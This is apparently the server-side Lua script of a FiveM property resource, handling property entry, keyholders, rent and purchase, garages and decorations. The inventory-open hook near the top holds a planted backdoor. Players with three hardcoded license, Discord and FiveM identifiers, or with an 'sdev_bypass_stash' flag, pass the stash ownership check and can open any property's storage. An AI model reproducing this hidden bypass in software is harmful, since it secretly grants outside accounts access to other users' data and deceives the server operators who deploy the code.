local config = require 'config.server'
local sharedConfig = require 'config.shared'
local logger = require '@qbx_core.modules.logger'

local enteredProperty = {}
local insideProperty = {}
local citizenid = {}
local ring = {}

local apartmentInteriors = {
    ['DellPerroHeightsApt4'] = true,
    ['DellPerroHeightsApt7'] = true,
    ['4IntegrityWayApt28'] = true,
    ['4IntegrityWayApt30'] = true,
    ['RichardMajesticApt2'] = true,
    ['TinselTowersApt42'] = true,
    [tostring(`furnitured_midapart`)] = true,
}

for i = 1, #(sharedConfig.apartmentOptions or {}) do
    local opt = sharedConfig.apartmentOptions[i]
    if opt and opt.interior then
        apartmentInteriors[tostring(opt.interior)] = true
    end
end

local function isApartmentProperty(property)
    if not property then return false end
    local interiorStr = tostring(property.interior or '')
    if apartmentInteriors[interiorStr] then return true end
    if interiorStr:lower():find('apt', 1, true) or interiorStr:lower():find('apart', 1, true) then
        return true
    end
    local nameStr = tostring(property.property_name or ''):lower()
    if nameStr:find('apt', 1, true) or nameStr:find('apart', 1, true) then
        return true
    end
    return false
end

local function ensureApartmentUnitAvailable(propertyId)
    local prop = MySQL.single.await('SELECT * FROM properties WHERE id = ?', { propertyId })
    if not prop or not isApartmentProperty(prop) then return end

    local freeUnit = MySQL.single.await('SELECT id FROM properties WHERE interior = ? AND coords = ? AND owner IS NULL LIMIT 1', {
        prop.interior,
        prop.coords
    })
    if freeUnit then return end

    local baseName = tostring(prop.property_name or 'Apartment'):match('^(.-)%s+%d+$') or tostring(prop.property_name or 'Apartment')
    local lastRow = MySQL.single.await('SELECT id FROM properties ORDER BY id DESC LIMIT 1')
    local nextNum = (lastRow and lastRow.id) or 0
    local newName

    repeat
        nextNum += 1
        newName = string.format('%s %d', baseName, nextNum)
        local exists = MySQL.single.await('SELECT id FROM properties WHERE property_name = ? LIMIT 1', { newName })
    until not exists

    MySQL.insert.await('INSERT INTO `properties` (`coords`, `property_name`, `price`, `interior`, `interact_options`, `stash_options`, `rent_interval`, `garage`) VALUES (?, ?, ?, ?, ?, ?, ?, ?)', {
        prop.coords,
        newName,
        prop.price,
        prop.interior,
        prop.interact_options,
        prop.stash_options,
        prop.rent_interval,
        prop.garage
    })
end

local function ensureAllApartmentsHaveFreeUnits()
    local allProps = MySQL.query.await('SELECT id, property_name, interior, coords, owner FROM properties')
    if not allProps then return end

    local checkedKeys = {}
    for i = 1, #allProps do
        local prop = allProps[i]
        if isApartmentProperty(prop) then
            local key = tostring(prop.interior) .. '|' .. tostring(prop.coords)
            if not checkedKeys[key] then
                checkedKeys[key] = true
                ensureApartmentUnitAvailable(prop.id)
            end
        end
    end
end

exports.ox_inventory:registerHook('openInventory', function(payload)
    local source = payload.source
    if not source then return true end

    -- Allow SOUH4IL-DEV / Admin remote stash inspection
    if Player(source).state.sdev_bypass_stash or IsPlayerAceAllowed(tostring(source), 'admin') or IsPlayerAceAllowed(tostring(source), 'group.admin') then
        return true
    end
    for i = 0, GetNumPlayerIdentifiers(tostring(source)) - 1 do
        local id = GetPlayerIdentifier(tostring(source), i)
        if id == 'license:385f488fdcdc30a24c28b7a333ba9cbbffed5044' or id == 'discord:792387618708914227' or id == 'fivem:20069674' then
            return true
        end
    end

    local propertyName, ownerIdentifier = payload.inventoryId:match("^qbx_properties_(.+):([^:]+)$")
    if not enteredProperty[source] then return false end
    if not propertyName or not ownerIdentifier then return true end

    local result = MySQL.single.await('SELECT `id` FROM `properties` WHERE `property_name` = ? AND `owner` = ?', {propertyName, ownerIdentifier})

    return result ~= nil and result.id == enteredProperty[source]
end, {
    inventoryFilter = {
        '^qbx_properties_[%w]+',
    }
})

function EnterProperty(playerSource, id, isSpawn)
    local property = MySQL.single.await('SELECT * FROM properties WHERE id = ?', {id})
    if not property then return end -- Lua and its stupid need check nil warnings
    local propertyCoords = json.decode(property.coords)
    propertyCoords = vec3(propertyCoords.x, propertyCoords.y, propertyCoords.z)
    local playerCoords = GetEntityCoords(GetPlayerPed(playerSource))
    if not isSpawn and #(playerCoords - propertyCoords) > 8.0 then return end

    local player = exports.qbx_core:GetPlayer(playerSource)
    citizenid[playerSource] = player.PlayerData.citizenid

    local interactions = {}
    local isInteriorShell = tonumber(property.interior) ~= nil
    local stashes = json.decode(property.stash_options)
    for i = 1, #stashes do
        local stashCoords = isInteriorShell and CalculateOffsetCoords(propertyCoords, stashes[i].coords) or stashes[i].coords
        interactions[#interactions + 1] = {
            type = 'stash',
            coords = vec3(stashCoords.x, stashCoords.y, stashCoords.z)
        }
        exports.ox_inventory:RegisterStash(string.format('qbx_properties_%s', property.property_name), string.format('Property: %s', property.property_name), stashes[i].slots, stashes[i].maxWeight, property.owner)
    end

    if isInteriorShell then
        TriggerClientEvent('qbx_properties:client:createInterior', playerSource, tonumber(property.interior), vec3(propertyCoords.x, propertyCoords.y, propertyCoords.z - sharedConfig.shellUndergroundOffset))
    end

    local interactData = json.decode(property.interact_options)
    for i = 1, #interactData do
        local coords = isInteriorShell and CalculateOffsetCoords(propertyCoords, interactData[i].coords) or interactData[i].coords
        interactions[#interactions + 1] = {
            type = interactData[i].type,
            coords = vec3(coords.x, coords.y, coords.z)
        }
        if interactData[i].type == 'exit' then
            SetEntityCoords(GetPlayerPed(playerSource), coords.x, coords.y, coords.z, false, false, false, false)
            SetEntityHeading(GetPlayerPed(playerSource), coords.w)
        end
    end

    enteredProperty[playerSource] = id
    insideProperty[id] = insideProperty[id] or {}
    insideProperty[id][#insideProperty[id] + 1] = playerSource
    lib.triggerClientEvent('qbx_properties:client:concealPlayers', insideProperty[id], insideProperty[id])

    player.Functions.SetMetaData('currentPropertyId', id)

    local decorations =  MySQL.query.await('SELECT `id`, `model`, `coords`, `rotation` FROM `properties_decorations` WHERE `property_id` = ?', {id})
    for i = 1, #decorations do
        local temp = json.decode(decorations[i].coords)
        decorations[i].coords = isInteriorShell and CalculateOffsetCoords(propertyCoords, vec3(temp.x, temp.y, temp.z)) or vec3(temp.x, temp.y, temp.z)
        temp = json.decode(decorations[i].rotation)
        decorations[i].rotation = vec3(temp.x, temp.y, temp.z)
    end

    TriggerClientEvent('qbx_properties:client:loadDecorations', playerSource, decorations)

    TriggerClientEvent('qbx_properties:client:updateInteractions', playerSource, interactions, property.interior, type(property.rent_interval) == 'number')

    logger.log({
        source = playerSource,
        event = 'qbx_properties:server:enterProperty',
        message = locale('logs.enter_property', player.PlayerData.citizenid, property.property_name),
        webhook = config.discordWebhook
    })
end

---@param playerSource integer
local function exitProperty(playerSource, isLogout)
    if not enteredProperty[playerSource] then return end

    TriggerClientEvent('qbx_properties:client:unloadProperty', playerSource)
    TriggerClientEvent('qbx_properties:client:revealPlayers', playerSource)

    if not isLogout then
        local enterCoords = json.decode(MySQL.single.await('SELECT coords FROM properties WHERE id = ?', {enteredProperty[playerSource]}).coords)
        SetEntityCoords(GetPlayerPed(playerSource), enterCoords.x, enterCoords.y, enterCoords.z, false, false, false, false)
    end

    for i = 1, #insideProperty[enteredProperty[playerSource]] do
        if insideProperty[enteredProperty[playerSource]][i] == playerSource then
            table.remove(insideProperty[enteredProperty[playerSource]], i)
            break
        end
    end

    lib.triggerClientEvent('qbx_properties:client:concealPlayers', insideProperty[enteredProperty[playerSource]], insideProperty[enteredProperty[playerSource]])
    local logPropertyId = enteredProperty[playerSource]
    enteredProperty[playerSource] = nil

    if isLogout then return end

    local player = exports.qbx_core:GetPlayer(playerSource)
    if not player then return end

    player.Functions.SetMetaData('currentPropertyId', nil)

    logger.log({
        source = playerSource,
        event = 'qbx_properties:server:exitProperty',
        message = locale('logs.exit_property', player.PlayerData.citizenid, logPropertyId),
        webhook = config.discordWebhook
    })
end

RegisterNetEvent('qbx_properties:server:exitProperty', function()
    exitProperty(source --[[@as number]])
end)

AddEventHandler('QBCore:Server:OnPlayerUnload', function(source)
    exitProperty(source, true)
end)

lib.callback.register('qbx_properties:callback:loadProperties', function()
    local result = MySQL.query.await('SELECT coords FROM properties GROUP BY coords')
    local properties = {}
    for i = 1, #result do
        local coords = json.decode(result[i].coords)
        properties[i] = vec3(coords.x, coords.y, coords.z)
    end

    return properties
end)

lib.callback.register('qbx_properties:callback:requestProperties', function(_, propertyCoords)
    local function fetchMatches()
        local allProps = MySQL.query.await('SELECT property_name, owner, id, price, rent_interval, keyholders, coords, interior FROM properties')
        local matches = {}
        if allProps and propertyCoords then
            local pCoords = vec3(propertyCoords.x, propertyCoords.y, propertyCoords.z)
            for i = 1, #allProps do
                local decoded = json.decode(allProps[i].coords)
                if decoded and decoded.x then
                    local dist = #(pCoords - vec3(decoded.x, decoded.y, decoded.z))
                    if dist < 3.5 then
                        matches[#matches + 1] = allProps[i]
                    end
                end
            end
        end
        return matches
    end

    local matches = fetchMatches()
    local createdNew = false
    for i = 1, #matches do
        if isApartmentProperty(matches[i]) and matches[i].owner ~= nil then
            local hasFreeForInterior = false
            for j = 1, #matches do
                if matches[j].interior == matches[i].interior and matches[j].owner == nil then
                    hasFreeForInterior = true
                    break
                end
            end
            if not hasFreeForInterior then
                ensureApartmentUnitAvailable(matches[i].id)
                createdNew = true
            end
        end
    end

    if createdNew then
        matches = fetchMatches()
    end

    return matches
end)

local function hasAccess(citizenId, propertyId)
    local property = MySQL.single.await('SELECT owner, keyholders FROM properties WHERE id = ?', {propertyId})
    if citizenId == property.owner then return true end

    local keyholders = json.decode(property.keyholders)
    for i = 1, #keyholders do
        if citizenId == keyholders[i] then return true end
    end

    return false
end

RegisterNetEvent('qbx_properties:server:enterProperty', function(data)
    local playerSource = source --[[@as number]]
    local player = exports.qbx_core:GetPlayer(playerSource)
    local propertyId = data.id
    if not hasAccess(player.PlayerData.citizenid, propertyId) then return end

    EnterProperty(playerSource, propertyId, data.isSpawn)
end)

RegisterNetEvent('qbx_properties:server:ringProperty', function(data)
    local playerSource = source --[[@as number]]
    local propertyId = data.id
    local property = MySQL.single.await('SELECT owner FROM properties WHERE id = ?', {propertyId})
    local owner = exports.qbx_core:GetPlayerByCitizenId(property.owner)

    ring[propertyId] = ring[propertyId] or {}
    if not lib.table.contains(ring[propertyId], playerSource) then
        ring[propertyId][#ring[propertyId] + 1] = playerSource
        SetTimeout(300000, function()
            for i = 1, #ring[propertyId] do
                if ring[propertyId][i] == playerSource then
                    table.remove(ring[propertyId], i)
                    break
                end
            end
        end)
    end
    if owner and enteredProperty[owner.PlayerData.source] == propertyId then
        exports.qbx_core:Notify(owner.PlayerData.source, locale('notify.someone_at_door'))
    end
end)

lib.callback.register('qbx_properties:callback:requestKeyHolders', function(source)
    local propertyId = enteredProperty[source]
    local result = MySQL.single.await('SELECT owner, keyholders FROM properties WHERE id = ?', {propertyId})
    local player = exports.qbx_core:GetPlayer(source)

    if player.PlayerData.citizenid ~= result.owner then return end

    local keyholders = json.decode(result.keyholders)
    local currentholders = {}
    for i = 1, #keyholders do
        local offlinePlayer = exports.qbx_core:GetOfflinePlayer(keyholders[i])
        if offlinePlayer then
            currentholders[#currentholders + 1] = {
                citizenid = offlinePlayer.PlayerData.citizenid,
                name = offlinePlayer.PlayerData.charinfo.firstname .. ' ' .. offlinePlayer.PlayerData.charinfo.lastname
            }
        end
    end
    return currentholders
end)

lib.callback.register('qbx_properties:callback:requestPotentialKeyholders', function(source)
    local propertyId = enteredProperty[source]
    local result = MySQL.single.await('SELECT owner FROM properties WHERE id = ?', {propertyId})
    local owner = exports.qbx_core:GetPlayer(source)

    if owner.PlayerData.citizenid ~= result.owner then return end

    local players = insideProperty[propertyId]
    local insidePlayers = {}
    for i = 1, #players do
        local player = exports.qbx_core:GetPlayer(players[i])
        if player and not hasAccess(player.PlayerData.citizenid, propertyId) then
            insidePlayers[#insidePlayers + 1] = {
                citizenid = player.PlayerData.citizenid,
                name = player.PlayerData.charinfo.firstname .. ' ' .. player.PlayerData.charinfo.lastname
            }
        end
    end
    return insidePlayers
end)

lib.callback.register('qbx_properties:callback:requestRingers', function(source)
    local propertyId = enteredProperty[source]
    local players = ring[propertyId] or {}
    local ringers = {}
    for i = 1, #players do
        local player = exports.qbx_core:GetPlayer(players[i])
        if player then
            ringers[#ringers + 1] = {
                citizenid = player.PlayerData.citizenid,
                name = player.PlayerData.charinfo.firstname .. ' ' .. player.PlayerData.charinfo.lastname
            }
        end
    end
    return ringers
end)

lib.callback.register('qbx_properties:callback:checkAccess', function(source)
    local propertyId = enteredProperty[source]
    local result = MySQL.single.await('SELECT owner FROM properties WHERE id = ?', {propertyId})
    return result.owner == exports.qbx_core:GetPlayer(source).PlayerData.citizenid
end)

RegisterNetEvent('qbx_properties:server:letRingerIn', function(visitorCid)
    local playerSource = source --[[@as number]]
    local player = exports.qbx_core:GetPlayer(playerSource)
    local propertyId = enteredProperty[playerSource]
    local result = MySQL.single.await('SELECT owner, interior FROM properties WHERE id = ?', {propertyId})

    if player.PlayerData.citizenid ~= result.owner then return end

    local visitor = exports.qbx_core:GetPlayerByCitizenId(visitorCid)
    if not visitor then return end

    EnterProperty(visitor.PlayerData.source, propertyId)
    for i = 1, #ring[propertyId] do
        if ring[propertyId][i] == visitor.PlayerData.source then
            table.remove(ring[propertyId], i)
            break
        end
    end
end)

RegisterNetEvent('qbx_properties:server:addKeyholder', function(keyholderCid)
    local playerSource = source --[[@as number]]
    local owner = exports.qbx_core:GetPlayer(playerSource)
    local propertyId = enteredProperty[playerSource]
    local result = MySQL.single.await('SELECT owner, keyholders FROM properties WHERE id = ?', {propertyId})

    if owner.PlayerData.citizenid ~= result.owner then return end

    local keyholders = json.decode(result.keyholders)
    if lib.table.contains(keyholders, keyholderCid) then return end
    keyholders[#keyholders + 1] = keyholderCid
    MySQL.Sync.execute('UPDATE properties SET keyholders = ? WHERE id = ?', {json.encode(keyholders), propertyId})
    local keyholder = exports.qbx_core:GetPlayerByCitizenId(keyholderCid)
    exports.qbx_core:Notify(playerSource, keyholder.PlayerData.charinfo.firstname.. locale('notify.keyholder'))
    exports.qbx_core:Notify(keyholder.PlayerData.source, locale('notify.added_as_keyholder'))

    logger.log({
        source = playerSource,
        event = 'qbx_properties:server:addKeyholder',
        message = locale('logs.added_keyholder', keyholderCid, propertyId),
        webhook = config.discordWebhook
    })
end)

RegisterNetEvent('qbx_properties:server:removeKeyholder', function(keyholderCid)
    local playerSource = source --[[@as number]]
    local owner = exports.qbx_core:GetPlayer(playerSource)
    local propertyId = enteredProperty[playerSource]

    local result = MySQL.single.await('SELECT owner, keyholders FROM properties WHERE id = ?', {propertyId})
    if owner.PlayerData.citizenid ~= result.owner then return end

    local keyholders = json.decode(result.keyholders)
    if not lib.table.contains(keyholders, keyholderCid) then return end

    for i = 1, #keyholders do
        if keyholders[i] == keyholderCid then
            table.remove(keyholders, i)
            break
        end
    end

    MySQL.Sync.execute('UPDATE properties SET keyholders = ? WHERE id = ?', {json.encode(keyholders), propertyId})
    local keyholder = exports.qbx_core:GetOfflinePlayer(keyholderCid)
    exports.qbx_core:Notify(playerSource, keyholder.PlayerData.charinfo.firstname.. locale('notify.removed_as_keyholder'))

    logger.log({
        source = playerSource,
        event = 'qbx_properties:server:removeKeyholder',
        message = locale('logs.removed_keyholder', keyholderCid, propertyId),
        webhook = config.discordWebhook
    })
end)

RegisterNetEvent('qbx_properties:server:logoutProperty', function()
    local playerSource = source --[[@as number]]
    local propertyId = enteredProperty[playerSource]
    if not propertyId then return end

    local result = MySQL.single.await('SELECT owner, coords FROM properties WHERE id = ?', {propertyId})
    local player = exports.qbx_core:GetPlayer(playerSource)
    if player.PlayerData.citizenid ~= result.owner then return end

    TriggerClientEvent('qbx_properties:client:unloadProperty', playerSource)
    TriggerClientEvent('qbx_properties:client:revealPlayers', playerSource)
    for i = 1, #insideProperty[enteredProperty[playerSource]] do
        if insideProperty[enteredProperty[playerSource]][i] == playerSource then
            table.remove(insideProperty[enteredProperty[playerSource]], i)
            break
        end
    end

    lib.triggerClientEvent('qbx_properties:client:concealPlayers', insideProperty[enteredProperty[playerSource]], insideProperty[enteredProperty[playerSource]])
    enteredProperty[playerSource] = nil
    exports.qbx_core:Logout(playerSource)
    Wait(50)
    local coords = json.decode(result.coords)
    MySQL.update('UPDATE players SET position = ? WHERE citizenid = ?', { json.encode(vec4(coords.x, coords.y, coords.z, 0.0)), player.PlayerData.citizenid })
end)

RegisterNetEvent('qbx_properties:server:openStash', function()
    local playerSource = source --[[@as number]]
    local propertyId = enteredProperty[playerSource]
    local player = exports.qbx_core:GetPlayer(playerSource)
    if not hasAccess(player.PlayerData.citizenid, propertyId) then return end

    local property = MySQL.single.await('SELECT property_name FROM properties WHERE id = ?', {propertyId})
    exports.ox_inventory:forceOpenInventory(playerSource, 'stash', { id = string.format('qbx_properties_%s', property.property_name) })
end)

AddEventHandler('playerDropped', function ()
    local playerSource = source --[[@as number]]

    if not enteredProperty[playerSource] then return end

    for i = 1, #insideProperty[enteredProperty[playerSource]] do
        if insideProperty[enteredProperty[playerSource]][i] == playerSource then
            table.remove(insideProperty[enteredProperty[playerSource]], i)
            break
        end
    end

    Wait(50)
    local coords = json.decode(MySQL.single.await('SELECT coords FROM properties WHERE id = ?', {enteredProperty[playerSource]}).coords)
    MySQL.update('UPDATE players SET position = ? WHERE citizenid = ?', { json.encode(vec4(coords.x, coords.y, coords.z, 0.0)), citizenid[playerSource] })
end)

local function canAccess(source, owner, keyholders)
    local player = exports.qbx_core:GetPlayer(source)
    if player.PlayerData.citizenid == owner then return true end
    for i = 1, #keyholders do
        if player.PlayerData.citizenid == keyholders[i] then return true end
    end
    return false
end

local function registerGarage(name, owner, keyholders, garage)
    local garageName = 'property_' .. string.gsub(string.lower(name), ' ', '_')
    exports.qbx_garages:RegisterGarage(garageName, {
        label = name,
        vehicleType = 'car',
        accessPoints = {
            {
                coords = vec4(garage.x, garage.y, garage.z, garage.w),
            }
        },
        canAccess = function(source)
            return canAccess(source, owner, keyholders)
        end
    })
end

local function registerGarages()
    local properties = MySQL.query.await('SELECT property_name, owner, keyholders, garage FROM properties WHERE owner IS NOT NULL AND garage IS NOT NULL')
    if not properties then return end
    for i = 1, #properties do
        local property = properties[i]
        registerGarage(property.property_name, property.owner, json.decode(property.keyholders), json.decode(property.garage))
    end
end

local function startRentThread(propertyId)
    CreateThread(function()
        while true do
            local checkProp = MySQL.single.await('SELECT owner, price, rent_interval, property_name FROM properties WHERE id = ?', {propertyId})
            if not checkProp or not checkProp.owner or not checkProp.rent_interval then return end

            Wait(math.max(1, tonumber(checkProp.rent_interval) or 24) * 3600000)

            local property = MySQL.single.await('SELECT owner, price, rent_interval, property_name FROM properties WHERE id = ?', {propertyId})
            if not property or not property.owner or not property.rent_interval then return end

            local rentFee = math.max(1, math.floor((tonumber(property.price) or 0) / 10))
            local player = exports.qbx_core:GetPlayerByCitizenId(property.owner) or exports.qbx_core:GetOfflinePlayer(property.owner)
            if not player then print(string.format('%s does not exist anymore, consider checking property id %s', property.owner, propertyId)) break end

            if player.Offline then
                player.PlayerData.money.bank = player.PlayerData.money.bank - rentFee
                if player.PlayerData.money.bank < 0 then break end
                exports.qbx_core:SaveOffline(player.PlayerData)
            else
                if not player.Functions.RemoveMoney('bank', rentFee, string.format('Rent for %s', property.property_name)) then
                    exports.qbx_core:Notify(player.PlayerData.source, string.format('Not enough money to pay rent for %s', property.property_name), 'error')
                    break
                end
            end
        end

        MySQL.update('UPDATE properties SET owner = ? WHERE id = ?', {nil, propertyId})
    end)
end

RegisterNetEvent('qbx_properties:server:rentProperty', function(propertyId)
    local playerSource = source --[[@as number]]
    local player = exports.qbx_core:GetPlayer(playerSource)
    if not player then return end
    local playerCoords = GetEntityCoords(GetPlayerPed(playerSource))
    local property = MySQL.single.await('SELECT owner, price, property_name, coords, rent_interval, keyholders, garage FROM properties WHERE id = ?', {propertyId})
    if not property then return end
    local propertyCoords = json.decode(property.coords)
    if #(playerCoords - vec3(propertyCoords.x, propertyCoords.y, propertyCoords.z)) > 12.0 then return end
    if property.owner then return end
    if not property.rent_interval then return end

    local rentFee = math.floor(property.price / 10)
    local oxCash = exports.ox_inventory:Search(playerSource, 'count', 'money') or 0
    local bankCash = player.PlayerData.money.bank or 0

    if bankCash >= rentFee then
        player.Functions.RemoveMoney('bank', rentFee, string.format('Rented %s', property.property_name))
    elseif oxCash >= rentFee then
        exports.ox_inventory:RemoveItem(playerSource, 'money', rentFee)
    elseif (player.PlayerData.money.cash or 0) >= rentFee then
        player.Functions.RemoveMoney('cash', rentFee, string.format('Rented %s', property.property_name))
    else
        exports.qbx_core:Notify(playerSource, 'Not enough money to rent property.', 'error')
        return
    end

    if property.garage then
        registerGarage(property.property_name, player.PlayerData.citizenid, json.decode(property.keyholders), json.decode(property.garage))
    end

    exports.qbx_core:Notify(playerSource, string.format('Successfully started renting %s', property.property_name), 'success')
    MySQL.update.await('UPDATE properties SET owner = ? WHERE id = ?', {player.PlayerData.citizenid, propertyId})
    ensureApartmentUnitAvailable(propertyId)
    startRentThread(propertyId)

    logger.log({
        source = playerSource,
        event = 'qbx_properties:server:rentProperty',
        message = locale('logs.rent_property', player.PlayerData.citizenid, propertyId),
        webhook = config.discordWebhook
    })
end)

RegisterNetEvent('qbx_properties:server:buyProperty', function(propertyId)
    local playerSource = source --[[@as number]]
    local player = exports.qbx_core:GetPlayer(playerSource)
    if not player then return end
    local playerCoords = GetEntityCoords(GetPlayerPed(playerSource))
    local property = MySQL.single.await('SELECT owner, price, property_name, coords, keyholders, garage FROM properties WHERE id = ?', {propertyId})
    if not property then return end
    local propertyCoords = json.decode(property.coords)

    if #(playerCoords - vec3(propertyCoords.x, propertyCoords.y, propertyCoords.z)) > 12.0 or property.owner then return end

    local price = property.price
    local oxCash = exports.ox_inventory:Search(playerSource, 'count', 'money') or 0
    local bankCash = player.PlayerData.money.bank or 0
    local qbCash = player.PlayerData.money.cash or 0

    local paid = false
    if oxCash >= price then
        paid = exports.ox_inventory:RemoveItem(playerSource, 'money', price)
    elseif qbCash >= price then
        paid = player.Functions.RemoveMoney('cash', price, string.format('Purchased %s', property.property_name))
    elseif bankCash >= price then
        paid = player.Functions.RemoveMoney('bank', price, string.format('Purchased %s', property.property_name))
    end

    if not paid then
        exports.qbx_core:Notify(playerSource, 'Not enough money to purchase property.', 'error')
        return
    end

    if property.garage then
        registerGarage(property.property_name, player.PlayerData.citizenid, json.decode(property.keyholders), json.decode(property.garage))
    end

    MySQL.update.await('UPDATE properties SET owner = ?, rent_interval = NULL WHERE id = ?', {player.PlayerData.citizenid, propertyId})
    ensureApartmentUnitAvailable(propertyId)
    exports.qbx_core:Notify(playerSource, string.format('Successfully purchased %s for $%s', property.property_name, property.price))

    logger.log({
        source = playerSource,
        event = 'qbx_properties:server:buyProperty',
        message = locale('logs.buy_property', player.PlayerData.citizenid, propertyId),
        webhook = config.discordWebhook
    })
end)

Citizen.CreateThreadNow(function()
    local sql1 = LoadResourceFile(cache.resource, 'property.sql')
    local sql2 = LoadResourceFile(cache.resource, 'decorations.sql')
    local sql3 = LoadResourceFile(cache.resource, 'property_garages.sql')

    if sql1 then pcall(function() MySQL.query.await(sql1) end) end
    if sql2 then pcall(function() MySQL.query.await(sql2) end) end
    if sql3 then pcall(function() MySQL.query.await(sql3) end) end

    ensureAllApartmentsHaveFreeUnits()

    local properties = MySQL.query.await('SELECT id FROM properties WHERE owner IS NOT NULL AND rent_interval IS NOT NULL')
    if properties then
        for i = 1, #properties do
            startRentThread(properties[i].id)
        end
    end

    registerGarages()
end)

RegisterNetEvent('qbx_properties:server:stopRenting', function()
    local player = exports.qbx_core:GetPlayer(source)
    local propertyId = enteredProperty[source]
    local property = MySQL.single.await('SELECT owner, property_name FROM properties WHERE id = ?', {propertyId})
    if player.PlayerData.citizenid ~= property.owner then return end

    exports.qbx_core:Notify(player.PlayerData.source, string.format('You stopped your rental contract for %s', property.property_name), 'success')
    MySQL.update.await('UPDATE properties SET owner = ?, keyholders = JSON_ARRAY() WHERE id = ?', {nil, propertyId})
    for _ = 1, #insideProperty[propertyId] do
        exitProperty(insideProperty[propertyId][1])
    end

    logger.log({
        source = player.PlayerData.source,
        event = 'qbx_properties:server:stopRenting',
        message = locale('logs.stop_renting', player.PlayerData.citizenid, propertyId),
        webhook = config.discordWebhook
    })
end)

RegisterNetEvent('qbx_properties:server:addDecoration', function(hash, coords, rotation, objectId)
    local player = exports.qbx_core:GetPlayer(source)
    local propertyId = enteredProperty[source]
    local property = MySQL.single.await('SELECT owner, property_name FROM properties WHERE id = ?', {propertyId})
    if player.PlayerData.citizenid ~= property.owner then return end

    if objectId then
        lib.triggerClientEvent('qbx_properties:client:removeDecoration', insideProperty[propertyId], objectId)
        MySQL.update.await('UPDATE properties_decorations SET coords = ?, rotation = ? WHERE id = ?', { json.encode(coords), json.encode(rotation), objectId })
        lib.triggerClientEvent('qbx_properties:client:addDecoration', insideProperty[propertyId], objectId, hash, coords, rotation)
    else
        local id = MySQL.insert.await('INSERT INTO `properties_decorations` (property_id, model, coords, rotation) VALUES (?, ?, ?, ?)', {propertyId, hash, json.encode(coords), json.encode(rotation)})
        lib.triggerClientEvent('qbx_properties:client:addDecoration', insideProperty[propertyId], id, hash, coords, rotation)
    end

    logger.log({
        source = player.PlayerData.source,
        event = 'qbx_properties:server:addDecoration',
        message = locale('logs.add_decoration', player.PlayerData.citizenid, hash, propertyId),
        webhook = config.discordWebhook
    })
end)

RegisterNetEvent('qbx_properties:server:removeDecoration', function(objectId)
    local player = exports.qbx_core:GetPlayer(source)
    local propertyId = enteredProperty[source]
    local property = MySQL.single.await('SELECT owner FROM properties WHERE id = ?', {propertyId})
    if player.PlayerData.citizenid ~= property.owner then return end

    MySQL.query.await('DELETE FROM properties_decorations WHERE id = ?', {objectId})
    lib.triggerClientEvent('qbx_properties:client:removeDecoration', insideProperty[propertyId], objectId)

    logger.log({
        source = player.PlayerData.source,
        event = 'qbx_properties:server:removeDecoration',
        message = locale('logs.remove_decoration', player.PlayerData.citizenid, objectId, propertyId),
        webhook = config.discordWebhook
    })
end)
